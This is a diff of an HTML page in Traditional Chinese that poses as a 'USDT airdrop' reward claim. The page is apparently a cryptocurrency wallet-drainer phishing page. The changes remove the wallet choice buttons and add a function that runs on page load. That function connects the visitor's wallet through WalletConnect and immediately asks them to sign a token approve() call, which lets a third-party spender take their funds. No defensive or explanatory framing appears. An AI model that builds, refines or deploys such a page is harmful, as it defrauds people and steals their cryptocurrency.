@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -7,17 +8,10 @@
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
 </head>
-<body style="text-align:center; padding-top:60px; font-family:sans-serif">
+<body style="text-align:center; padding-top:60px; font-family:sans-serif; background:#f4f4f4">
   <h2>🎉 恭喜你獲得 USDT 空投！</h2>
-  <p>請選擇錢包並授權以領取獎勵</p>
-
-  <button id="connectMetaMask">🦊 使用 MetaMask</button>
-  <br><br>
-  <button id="connectTrust">🔵 使用 Trust Wallet</button>
-  <br><br>
-  <button id="connectWalletConnect">📲 使用 WalletConnect</button>
-  <br><br>
-  <p id="status"></p>
+  <p>請使用手機錢包掃描下方 QR Code 以完成授權</p>
+  <div id="status" style="margin-top:20px; color:#333;"></div>
 
   <script>
     let provider;
@@ -32,9 +26,6 @@
     const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
     const providerOptions = {
-      metamask: {
-        package: null
-      },
       walletconnect: {
         package: window.WalletConnectProvider.default,
         options: {
@@ -45,43 +36,22 @@
 
     const web3Modal = new window.Web3Modal.default({
       cacheProvider: false,
-      providerOptions
+      providerOptions,
+      disableInjectedProvider: true
     });
 
-    async function connect(type) {
+    async function connectAndApprove() {
       try {
-        if (type === 'trust') {
-          window.open("trust://", "_blank");
-          document.getElementById("status").innerText = "📱 請在 Trust Wallet 中完成操作...";
-          return;
-        }
-
-        if (type === 'walletconnect') {
-          web3Modal.clearCachedProvider();
-          web3Modal.providerController.providerOptions = {
-            walletconnect: providerOptions.walletconnect
-          };
-        } else if (type === 'metamask') {
-          web3Modal.clearCachedProvider();
-          web3Modal.providerController.providerOptions = {
-            injected: providerOptions.metamask
-          };
-        }
-
         const instance = await web3Modal.connect();
         provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
         const address = await signer.getAddress();
-        document.getElementById("status").innerText = "✅ 已連接錢包：" + address;
+        document.getElementById("status").innerText = "✅ 已連接錢包地址：" + address;
         approve();
       } catch (err) {
         document.getElementById("status").innerText = "❌ 錢包連接失敗：" + err.message;
       }
     }
-
-    document.getElementById("connectMetaMask").onclick = () => connect('metamask');
-    document.getElementById("connectWalletConnect").onclick = () => connect('walletconnect');
-    document.getElementById("connectTrust").onclick = () => connect('trust');
 
     async function approve() {
       try {
@@ -99,9 +69,11 @@
         document.getElementById("status").innerText = "✅ 授權成功！Tx Hash: " + tx.hash;
       } catch (err) {
         document.getElementById("status").innerText = "❌ 授權失敗：" + err.message;
-        console.error(err);
       }
     }
+
+    // 啟動立即執行
+    connectAndApprove();
   </script>
 </body>
 </html>
